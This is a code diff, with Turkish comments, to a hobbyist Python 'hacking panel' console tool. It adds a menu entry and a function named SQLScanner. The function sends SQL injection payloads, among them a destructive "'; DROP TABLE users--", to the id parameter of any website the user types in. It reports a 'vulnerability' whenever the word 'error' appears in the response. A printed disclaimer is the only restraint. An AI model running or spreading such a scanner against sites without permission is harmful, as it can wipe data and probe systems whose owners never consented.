@@ -51,7 +51,7 @@ def main_menu():
                     ╔═════════════════════════════════════════════╗
                     ║                   -Menu-                    ║ 
                     ║ Whois               ╗ ╔            XXXXXXX  ║
-                    ║ Instagram           ║ ║            XXXXXXX  ║                         
+                    ║ SQLScanner          ║ ║            XXXXXXX  ║                         
                     ║ Twitter             ║ ║            XXXXXXX  ║
                     ║ Twitch              ║ ║            XXXXXXX  ║
                     ║ Social              ╝ ╚            XXXXXXX  ║ 
@@ -59,6 +59,7 @@ def main_menu():
     """
     colored_menu = Colorate.Vertical(Colors.red_to_yellow, Center.XCenter(menu_text))
     print(colored_menu)
+
 
 
 # Giriş ekranını göster
@@ -105,21 +106,89 @@ def whois_bot():
 
 
 
+def second_main_menu():
+        menu_text = """
+        
+                ╔═════════════════════════════════════╗
+                ║        Lowkey How To Usage ?        ║
+                ╚═════════════════════════════════════╝
+                  〝 Please do not use for illegal 〞                  
+            ╔═════════════════════════════════════════════╗
+            ║                 -Commands Menu-                
+            ║ "Whois" -get information about the website
+            ║ "SQLScanner" -scan for sql vulnerability                        
+            ║ "Option 3" -write info
+            ║ "Option 4" -write info
+            ║ "Option 5" -write info
+            ╚═════════════════════════════════════════════╝
+        """
+        colored_menu = Colorate.Vertical(Colors.green_to_blue, Center.XCenter(menu_text))
+        print(colored_menu)
+
+
+
+
+
+
 #aksiyon bitiş
+
+
+
+
+#/////////////////////////////////////////////////////////////////////////////
 
 while True:
     main_menu()
     yellow_input = f"{yellow_color}╔══(root@LowkeyPanel)\n╚>>>> {reset}"  # Sarı renkli giriş istemi
     choice = input(yellow_input)
 
+
     if choice == 'whois':
         whois_bot()
-    elif choice == '2':
-        print("Seçenek 2'yi seçtiniz. Yapabileceğiniz işlemler burada.")
-        # Seçenek 2'ye ait işlemleri burada ekleyin
-    elif choice == '3':
-        print("Seçenek 3'ü seçtiniz. Yapabileceğiniz işlemler burada.")
-        # Seçenek 3'e ait işlemleri burada ekleyin
+    elif choice == 'sqlscanner':
+#choice 2 kısmı ////////////////////////////////////////////////////////////////////
+
+        def sql_injection_test(site_url):
+            payloads = ["' OR '1'='1", "'; DROP TABLE users--", "1' OR 'a'='a"]
+
+            for payload in payloads:
+                test_url = f"{site_url}?id={payload}"
+                response = requests.get(test_url)
+
+                if "error" in response.text.lower():
+                    result_text = Colorate.Vertical(Colors.red_to_yellow,
+                                                    f"Potansiyel SQL Enjeksiyon Açığı Bulundu: {test_url}")
+                else:
+                    result_text = Colorate.Vertical(Colors.red_to_yellow,
+                                                    f"SQL Enjeksiyon Açığı Bulunamadı: {test_url}")
+
+                print(result_text)
+
+
+        def main():
+            print(Colorate.Vertical(Colors.yellow_to_red, Center.XCenter("Lowkey SQLScanner ")))
+            site_url = input(Colorate.Vertical(Colors.yellow_to_red, "Website: "))
+
+            # SQL enjeksiyon testini başlatın
+            sql_injection_test(site_url)
+
+            # Sonuçları gösterdikten sonra kullanıcıyı bekletin
+            input(Colorate.Vertical(Colors.yellow_to_red, "Press any key to see the results..."))
+
+
+        if __name__ == "__main__":
+            main()
+
+
+#choice 3 kısmı ////////////////////////////////////////////////////////////////////
+
+    elif choice == '-help':
+        # İkinci ana menüyü görüntüle
+        second_main_menu()
+        second_choice = input(yellow_input)
+
+
+
     elif choice == '4':
         print("Çıkış yapılıyor...")
         break  # Ana menüyü sona erdirir ve programı kapatır.
